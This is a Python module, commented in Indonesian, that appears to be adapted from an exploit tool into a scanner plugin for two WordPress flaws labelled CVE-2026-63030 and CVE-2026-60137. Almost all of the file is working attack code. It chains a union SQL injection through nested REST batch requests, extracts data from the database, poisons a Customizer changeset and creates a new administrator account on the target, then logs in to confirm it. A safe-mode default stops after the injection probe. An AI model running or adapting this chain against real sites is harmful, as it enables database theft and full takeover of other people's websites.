# cve_modules/wp_batch.py
"""
CVE-2026-63030 + CVE-2026-60137 — WordPress Privilege Escalation
  - CVE-2026-63030: REST API batch route confusion (SQL injection)
  - CVE-2026-60137: Customizer changeset re-entry (privilege escalation)

Adaptasi dari tools exploit HanJsXploit (v3.2.0) jadi modul scanning
untuk main.py.

PENTING:
  Full exploit BIKIN USER ADMIN BARU di target. Ini bukan scanning pasif.
  Default safe_mode=True: cuma cek fingerprint + union probe, TANPA
  bikin user / nulis data ke target.
  Set safe_mode=False hanya untuk target yang lu punya izin eksplisit.
"""

from __future__ import annotations

import hashlib
import json
import re
import secrets
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from http.cookiejar import CookieJar
from typing import Any, Dict, List, Optional, Tuple


# ── metadata untuk main.py ──────────────────────────────────────────────

CVE_META = {
    "id": "CVE-2026-63030+CVE-2026-60137",
    "name": "WordPress REST batch SQLi + PrivEsc",
    "func": "check_cve_2026_63030_60137",
    # default: safe_mode=True (TIDAK bikin admin, cuma probe)
    "kwargs": {"safe_mode": True},
    "priority": 40,
}


# ── konstanta ───────────────────────────────────────────────────────────

DESYNC_PRIMER = {"method": "POST", "path": "///"}
FAKE_ID_BASE = 1_800_000_000
POST_DATE = "2020-01-01 00:00:00"
EMBED_WIDTH = "500"
EMBED_HEIGHT = "750"
EMBED_ATTRS_SERIALIZED = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'
UNION_MARKER_HEX = "776f726470726573733078"
DEFAULT_TIMEOUT = 30.0


class TargetError(Exception):
    pass


# ── helpers ─────────────────────────────────────────────────────────────

def _sql_hex(s: str) -> str:
    if not s:
        return "''"
    return "0x" + s.encode("utf-8").hex()


def _sql_post_row(row_id, content="", title="", status="publish", slug="",
                  parent=0, post_type="post", author=1) -> str:
    id_col = str(row_id)
    slug = slug or f"r{secrets.token_hex(3)}"
    return "SELECT " + ",".join([
        id_col, str(author), f"'{POST_DATE}'", f"'{POST_DATE}'",
        _sql_hex(content), _sql_hex(title), "''", _sql_hex(status),
        "'closed'", "'closed'", "''", _sql_hex(slug), "''", "''",
        f"'{POST_DATE}'", f"'{POST_DATE}'", "''", str(parent), "''",
        "0", _sql_hex(post_type), "''", "0",
    ])


def _oembed_cache_key(url: str) -> str:
    payload = url + EMBED_ATTRS_SERIALIZED
    return hashlib.md5(payload.encode()).hexdigest()


# ── HTTP client ─────────────────────────────────────────────────────────

@dataclass
class _Response:
    status: int
    body: str
    elapsed: float
    headers: Dict[str, str] = field(default_factory=dict)

    def json(self) -> Any:
        return json.loads(self.body)


class _Client:
    def __init__(self, base_url: str, timeout: float = DEFAULT_TIMEOUT):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.request_count = 0
        self._batch_url = None
        self._cookie_jar = CookieJar()
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        self._opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=ctx),
            urllib.request.HTTPCookieProcessor(self._cookie_jar),
        )
        self._opener.addheaders = [("User-Agent",
                                    "Mozilla/5.0 (compatible)")]

    @property
    def batch_url(self) -> str:
        if self._batch_url is None:
            self._batch_url = self._negotiate_batch_url()
        return self._batch_url

    def _negotiate_batch_url(self) -> str:
        pretty = f"{self.base_url}/wp-json/batch/v1"
        try:
            resp = self._send(pretty, method="POST",
                              data=b'{"requests":[]}',
                              headers={"Content-Type": "application/json"},
                              timeout=min(self.timeout, 10))
            if resp.status == 207:
                return pretty
        except Exception:
            pass
        return f"{self.base_url}/?rest_route=/batch/v1"

    def get(self, path: str) -> _Response:
        url = self.base_url + (path if path.startswith("/") else f"/{path}")
        return self._send(url, method="GET")

    def batch(self, payload: dict, timeout: Optional[float] = None) -> _Response:
        return self._send(
            self.batch_url, method="POST",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json"},
            timeout=timeout or self.timeout,
        )

    def _send(self, url, method="GET", data=None, headers=None,
              timeout=None) -> _Response:
        req = urllib.request.Request(url, data=data, method=method)
        for k, v in (headers or {}).items():
            req.add_header(k, v)
        self.request_count += 1
        start = time.monotonic()
        try:
            resp = self._opener.open(req, timeout=timeout or self.timeout)
            return _Response(resp.status,
                             resp.read().decode("utf-8", "replace"),
                             time.monotonic() - start,
                             dict(resp.headers))
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace") if e.fp else ""
            return _Response(e.code, body, time.monotonic() - start,
                             dict(e.headers) if e.headers else {})
        except OSError as e:
            raise TargetError(f"Cannot reach {url}: {e}") from None

    def login(self, username, password) -> bool:
        login_url = f"{self.base_url}/wp-login.php"
        data = urllib.parse.urlencode({
            "log": username, "pwd": password, "wp-submit": "Log In",
            "redirect_to": f"{self.base_url}/wp-admin/", "testcookie": "1",
        }).encode()
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        resp = self._send(login_url, method="POST", data=data,
                          headers=headers, timeout=15)
        location = ""
        for k, v in resp.headers.items():
            if k.lower() == "location":
                location = v
                break
        if resp.status in (301, 302) and "wp-admin" in location:
            return True
        if resp.status == 200 and ("dashboard" in resp.body.lower()
                                   or "wp-admin" in resp.body.lower()):
            return True
        for cookie in self._cookie_jar:
            if cookie.name == "wordpress_logged_in" and cookie.value:
                return True
        return False


# ── desync & extractor ─────────────────────────────────────────────────

class _Desync:
    def __init__(self, client: _Client):
        self.client = client

    def union_inject(self, rows: str, timeout=None,
                     tail_requests: List[dict] = None) -> _Response:
        sql_term = "\n-- " * 6
        sqli = f"0) AND 1=0 UNION ALL {rows}{sql_term}"
        return self.client.batch(self._union_payload(sqli, tail_requests),
                                 timeout=timeout)

    def _union_payload(self, sqli, tail_requests=None) -> dict:
        encoded = urllib.parse.quote(sqli, safe="")
        inner = [
            DESYNC_PRIMER,
            {"method": "GET", "path": (
                f"/wp/v2/widgets?author_exclude={encoded}"
                "&per_page=500&orderby=none")},
            {"method": "GET", "path": "/wp/v2/posts"},
            {"method": "GET", "path": "/wp/v2/categories"},
        ]
        if tail_requests:
            inner.extend(tail_requests)
            inner.append({"method": "POST", "path": "/wp/v2/users",
                          "body": {}})
        return {"requests": [
            DESYNC_PRIMER,
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner}},
            {"method": "POST", "path": "/batch/v1",
             "body": {"requests": []}},
        ]}


class _UnionExtractor:
    def __init__(self, desync: _Desync):
        self.desync = desync

    def available(self) -> bool:
        return self.extract("SELECT 'wp2shell_probe'") == "wp2shell_probe"

    def integer(self, query: str) -> int:
        val = self.extract(query)
        return int(val) if val and val.lstrip("-").isdigit() else 0

    def extract(self, query: str, max_length: int = 4096) -> Optional[str]:
        title_expr = f"CONCAT(0x{UNION_MARKER_HEX},HEX(CAST(({query}) AS CHAR)))"
        row = self._forge_row(title=title_expr)
        resp = self.desync.union_inject(row)
        return self._decode_response(resp)

    def _forge_row(self, title: str = "''") -> str:
        return "SELECT " + ",".join([
            "99999999", "1", f"'{POST_DATE}'", f"'{POST_DATE}'", "''",
            title, "''", "'publish'", "'closed'", "'closed'", "''",
            _sql_hex(f"u{secrets.token_hex(4)}"), "''", "''",
            f"'{POST_DATE}'", f"'{POST_DATE}'", "''", "0", "''",
            "0", "'post'", "''", "0",
        ])

    def _decode_response(self, resp: _Response) -> Optional[str]:
        marker = bytes.fromhex(UNION_MARKER_HEX).decode()
        idx = resp.body.find(marker)
        if idx < 0:
            return None
        after = resp.body[idx + len(marker):]
        hex_chars = []
        for ch in after:
            if ch in "0123456789abcdefABCDEF":
                hex_chars.append(ch)
            else:
                break
        if not hex_chars:
            return ""
        try:
            return bytes.fromhex("".join(hex_chars)).decode("utf-8", "replace")
        except ValueError:
            return None


def _discover_prefix(extractor, default="wp_") -> str:
    try:
        result = extractor.extract(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME LIKE '%usermeta' "
            "ORDER BY TABLE_NAME LIMIT 1", max_length=64)
        if result and result.endswith("usermeta"):
            return result[:-8]
    except Exception:
        pass
    return default


def _find_embed_url(client: _Client) -> Optional[str]:
    try:
        resp = client.get("/?rest_route=/wp/v2/posts&per_page=1&_fields=link")
        if resp.status == 200:
            posts = resp.json()
            if posts and isinstance(posts, list):
                return posts[0]["link"]
    except Exception:
        pass
    try:
        resp = client.get("/")
        if resp.status == 200:
            m = re.search(
                r'<link\s+rel=["\']canonical["\']\s+href=["\']([^"\']+)',
                resp.body)
            if m:
                return m.group(1)
    except Exception:
        pass
    return f"{client.base_url}/?p=1"


# ── entry point ─────────────────────────────────────────────────────────

def check_cve_2026_63030_60137(target_url: str,
                                timeout: float = DEFAULT_TIMEOUT,
                                safe_mode: bool = True,
                                verify_login: bool = True,
                                proxy: Optional[str] = None) -> dict:
    """
    Cek target terhadap CVE-2026-63030 (SQLi) + CVE-2026-60137 (PrivEsc).

    Args:
        target_url   : URL target
        timeout      : timeout HTTP (default 30s)
        safe_mode    : True  -> cuma cek batch endpoint + union probe
                                (TIDAK bikin admin user di target)
                       False -> full exploit (BIKIN ADMIN USER BARU!)
        verify_login : (hanya safe_mode=False) coba login pakai kredensial
                       yang dibuat, buat konfirmasi
        proxy        : opsional, mis. "http://127.0.0.1:8080"

    Returns:
        {
            "vulnerable": bool,
            "evidence":   str | None,
            "reason":     str,
            "sqli":       bool,
            "prefix":     str | None,
            "username":   str | None,   # hanya kalau safe_mode=False
            "password":   str | None,   # hanya kalau safe_mode=False
        }
    """
    if not target_url.startswith(("http://", "https://")):
        target_url = "https://" + target_url
    target_url = target_url.rstrip("/")

    result = {
        "vulnerable": False,
        "evidence": None,
        "reason": "",
        "sqli": False,
        "prefix": None,
        "username": None,
        "password": None,
    }

    try:
        client = _Client(target_url, timeout=timeout)
    except Exception as e:
        result["reason"] = f"client_init_error: {e}"
        return result

    # ── tahap 1: cek batch endpoint ──────────────────────────────────
    try:
        resp = client.batch({"requests": []})
    except TargetError as e:
        result["reason"] = f"unreachable: {str(e)[:120]}"
        return result

    if resp.status != 207:
        result["reason"] = f"batch_endpoint_status_{resp.status}"
        return result

    # ── tahap 2: union-based SQLi probe ──────────────────────────────
    desync = _Desync(client)
    extractor = _UnionExtractor(desync)
    if not extractor.available():
        result["reason"] = "batch_ok_but_union_sqli_not_confirmed"
        return result

    result["sqli"] = True
    result["prefix"] = _discover_prefix(extractor, "wp_")

    # ── safe_mode: berhenti di sini, nggak bikin user ────────────────
    if safe_mode:
        result["vulnerable"] = True
        result["evidence"] = (f"SQL injection confirmed via batch endpoint "
                              f"(prefix={result['prefix']}); priv-esc chain "
                              f"NOT executed (safe_mode=True)")
        result["reason"] = "sqli_confirmed_no_privesc"
        return result

    # ── full exploit: poison changeset & bikin admin user ────────────
    # Ini BIKIN USER BARU di target. Hanya untuk target yang punya izin.
    try:
        embed_url = _find_embed_url(client)
        if not embed_url:
            result["reason"] = "sqli_confirmed_but_no_embed_url"
            return result

        token = secrets.token_hex(6)

        # seed oembed cache
        urls = [f"{embed_url}#{token}{i}" for i in range(4)]
        content = "".join(
            f'[embed width="{EMBED_WIDTH}" height="{EMBED_HEIGHT}"]'
            f'{u}[/embed]' for u in urls)
        row = _sql_post_row(0, content=content, title="seed", slug="seed")
        desync.union_inject(row)

        time.sleep(0.5)

        # extract cache IDs
        cache_ids = []
        for i in range(4):
            url = f"{embed_url}#{token}{i}"
            key = _oembed_cache_key(url)
            pid = extractor.integer(
                f"SELECT ID FROM {result['prefix']}posts "
                f"WHERE post_type='oembed_cache' "
                f"AND post_name='{key}' LIMIT 1")
            if pid == 0:
                result["reason"] = "sqli_confirmed_but_cache_seed_failed"
                return result
            cache_ids.append(pid)

        # bikin kredensial admin baru
        username = "wp_admin_" + secrets.token_hex(3)
        password = secrets.token_urlsafe(16)
        email = f"{username}@local.host"

        # build poison graph (diambil dari class asli)
        base = FAKE_ID_BASE + secrets.randbelow(100_000_000)
        graph = _PoisonGraph(cache_ids, admin_id=1, base=base)
        changeset_json = _build_changeset(graph)
        trigger_url = f"{embed_url}#{token}1"
        union_rows = graph.build_rows(changeset_json, trigger_url)

        user_body = {
            "username": username, "password": password,
            "email": email, "roles": ["administrator"],
        }
        resp2 = desync.union_inject(
            union_rows,
            tail_requests=[{"method": "POST", "path": "/wp/v2/users",
                            "body": user_body}],
            timeout=timeout * 2)

        if not _check_creation_response(resp2):
            result["reason"] = "sqli_confirmed_but_user_creation_failed"
            return result

        result["username"] = username
        result["password"] = password

        if verify_login:
            time.sleep(1)
            if client.login(username, password):
                result["vulnerable"] = True
                result["evidence"] = (f"admin user created & login verified: "
                                      f"{username}")
                result["reason"] = "exploited_privesc_verified"
                return result
            result["reason"] = "user_creation_reported_but_login_failed"
            return result

        result["vulnerable"] = True
        result["evidence"] = f"admin user created (unverified): {username}"
        result["reason"] = "exploited_privesc_unverified"
        return result

    except TargetError as e:
        result["reason"] = f"error_during_exploit: {str(e)[:120]}"
        return result
    except Exception as e:
        result["reason"] = f"unexpected_error: {str(e)[:120]}"
        return result


# ── poison graph (diambil dari class asli) ──────────────────────────────

@dataclass
class _PoisonGraph:
    cache_post_ids: List[int]
    admin_id: int
    base: int

    def __post_init__(self):
        self.outer_id = self.base
        self.inner_id = self.base + 1
        self.changeset_id = self.cache_post_ids[0]
        self.oembed_id = self.cache_post_ids[1]
        self.navitem_id = self.cache_post_ids[2]
        self.reentry_id = self.cache_post_ids[3]

    def build_rows(self, changeset_json: str, embed_url: str) -> str:
        oembed_id_expr = (
            f"IF((@_wp2s:=IFNULL(@_wp2s,0)+1)=1,"
            f"{self.oembed_id},2000000000)")
        embed_content = (f'[embed width="{EMBED_WIDTH}" '
                         f'height="{EMBED_HEIGHT}"]{embed_url}[/embed]')
        rows = [
            _sql_post_row(0, content=embed_content, title="trigger",
                          slug="trigger"),
            _sql_post_row(self.changeset_id, content=changeset_json,
                          title="changeset", status="future",
                          slug=str(secrets.token_hex(8)),
                          parent=self.outer_id,
                          post_type="customize_changeset"),
            _sql_post_row(self.outer_id, title="outer", status="draft",
                          slug="outer", parent=self.changeset_id),
            _sql_post_row(oembed_id_expr, title="oembed", slug="oembed",
                          parent=self.changeset_id),
            _sql_post_row(self.navitem_id, title="navitem", slug="navitem",
                          post_type="nav_menu_item"),
            _sql_post_row(self.reentry_id, title="reentry", status="parse",
                          slug="reentry", parent=self.inner_id,
                          post_type="request"),
            _sql_post_row(self.inner_id, title="inner", status="draft",
                          slug="inner", parent=self.reentry_id),
        ]
        return " UNION ALL ".join(rows)


def _build_changeset(graph: _PoisonGraph) -> str:
    setting_key = f"nav_menu_item[{graph.navitem_id}]"
    data = {
        setting_key: {
            "value": {
                "object_id": graph.inner_id, "object": "post",
                "menu_item_parent": 0, "position": 1,
                "type": "post_type", "title": "", "url": "",
                "description": "", "attr_title": "", "target": "",
                "classes": "", "xfn": "", "status": "publish",
                "nav_menu_term_id": 0, "_invalid": False,
            },
            "type": "nav_menu_item", "user_id": graph.admin_id,
        }
    }
    return json.dumps(data, separators=(",", ":"))


def _check_creation_response(resp: _Response) -> bool:
    try:
        data = resp.json()
        if "responses" in data:
            outer = data["responses"]
            if len(outer) > 1 and "responses" in outer[1].get("body", {}):
                inner = outer[1]["body"]["responses"]
                for r in inner:
                    if isinstance(r, dict) and r.get("status") == 201:
                        return True
    except Exception:
        pass
    return False